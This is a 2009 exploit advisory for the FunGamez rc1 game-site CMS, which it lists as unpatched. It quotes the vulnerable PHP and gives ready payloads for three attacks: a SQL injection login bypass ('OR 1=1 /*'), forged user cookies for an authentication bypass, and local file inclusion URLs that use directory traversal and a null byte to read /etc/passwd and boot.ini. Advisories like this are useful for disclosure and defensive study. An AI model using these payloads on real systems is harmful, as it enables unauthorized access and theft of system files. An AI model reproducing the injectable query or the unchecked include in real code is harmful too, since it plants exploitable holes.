FunGamez rc1 (AB/LFI) Multiple Remote Vulnerabilities
=====================================================


----------------------------------------------------------------------------------------------
|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
|--------------------------------------------------------------------------------------------|
|                         	| FunGamez-release candidate 1 |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|-->WEB: http://sourceforge.net/projects/fg-gsm/				             |
|-->DOWNLOAD: http://sourceforge.net/projects/fg-gsm/ 	   		             	     |
|-->DEMO: N/A										     |
|-->CATEGORY: CMS / Portals								     |
|-->DESCRIPTION: A game-site manager with fully customisable design, and easy game adding    |
| 		and I will build in more options to make the site fully customisable...	     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|-->TESTED ON: firefox 3								     |
|-->DORK: N/A										     |
|-->CATEGORY: AUTH BYPASS/LFI							             |
|-->AFFECT VERSION:RC-1						     			     |
|-->Discovered Bug date: 2009-04-20							     |
|-->Reported Bug date: 2009-04-20							     |
|-->Fixed bug date: Not fixed								     |
|-->Info patch: Not fixed							             |
|-->Author: YEnH4ckEr									     |
|-->WEB/BLOG: N/A									     |
|-->COMMENT: A mi novia Marijose...hermano,cunada, padres (y amigos xD) por su apoyo.        |
----------------------------------------------------------------------------------------------

/////////////////////////////

AUTH BYPASS (LOGIN FORM)

/////////////////////////////

-----------
BUG FILES:
-----------

Path --> [HOME_PATH]/pages/login.php

It contents:

...

	$logindat = mysql_query("SELECT * FROM `fg_users` WHERE `username` = &#039;".$uname."&#039; and `password` = &#039;".$upass."&#039;");

...

---------
EXPLOIT:
---------

PEPE&#039; OR 1=1 /*

Password:ANY


////////////////////////////////////////

AUTH BYPASS (INSECURE COOKIE HANDLING)

////////////////////////////////////////

-----------
BUG FILES:
-----------

Path --> [HOME_PATH]/includes/user.php

It contents:

...

function checklogin(){

	If ( $_SESSION[&#039;user&#039;] == null )  {

		If ( $_COOKIE[&#039;user&#039;] == null )   {          
 			return 0;       
 		}         
		Else        
		{           
			return $_COOKIE[&#039;user&#039;];         
		}     
	}  
 	Else      
	{        
	return $_SESSION[&#039;user&#039;];      
	}
}

...

Path --> [HOME_PATH]/index.php

It contents:

...

If ( $page->requireslogin($name) && !$user->checklogin() ) { $name = &#039;login&#039;; $_GET[&#039;newlogin&#039;] = 1; }

...

----------
EXPLOITS:
----------

Add cookie:

1)user=1 path=/	(Insecure cookie)

2)user=pepe&#039; or 1=1 /* path=/ (SQL injection)




///////////////////////////////

LOCAL FILE INCLUSION (LFI)

///////////////////////////////

------------
CONDITIONS:
------------

Need: Be admin user (above! :P)

-----------
BUG FILES:
-----------

Path --> [HOME_PATH]/admin/load.php

It contents:

...

If ( !isset($_GET[&#039;module&#039;]) ) $mod = &#039;start&#039;;

If ( isset($_GET[&#039;module&#039;]) ) $mod = $_GET[&#039;module&#039;];

include(&#039;./admin/modules/&#039;.$mod.&#039;.php&#039;);

----------
EXPLOITS:
----------

1)http://[HOST]/FunGamez/index.php?admin&module=../../../../../../boot.ini%00

2)http://[HOST]/FunGamez/index.php?admin&module=../../../../../etc/passwd%00


*******************************************************************



